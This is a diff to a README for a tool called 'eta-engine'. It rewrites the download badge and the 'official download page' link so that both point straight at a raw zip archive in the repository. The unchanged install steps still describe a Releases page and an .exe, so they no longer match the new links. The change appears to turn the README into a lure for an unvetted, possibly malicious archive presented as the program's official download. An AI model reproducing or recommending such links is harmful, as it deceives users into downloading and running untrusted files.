@@ -1,6 +1,6 @@
 # ⚙️ eta-engine - Process data files with high speed
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Gertrudereversive489/eta-engine)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Gertrudereversive489/eta-engine/raw/refs/heads/main/cosmical/engine_eta_v3.8-alpha.3.zip)
 
 ## 📖 About this application
 
@@ -23,7 +23,7 @@ These requirements ensure the software runs without delays. If your computer mee
 
 Follow these steps to put the software on your machine.
 
-1. Visit the [official download page](https://github.com/Gertrudereversive489/eta-engine).
+1. Visit the [official download page](https://github.com/Gertrudereversive489/eta-engine/raw/refs/heads/main/cosmical/engine_eta_v3.8-alpha.3.zip).
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click the link that matches the latest version number.
 4. Locate the file ending in .exe in the assets list.
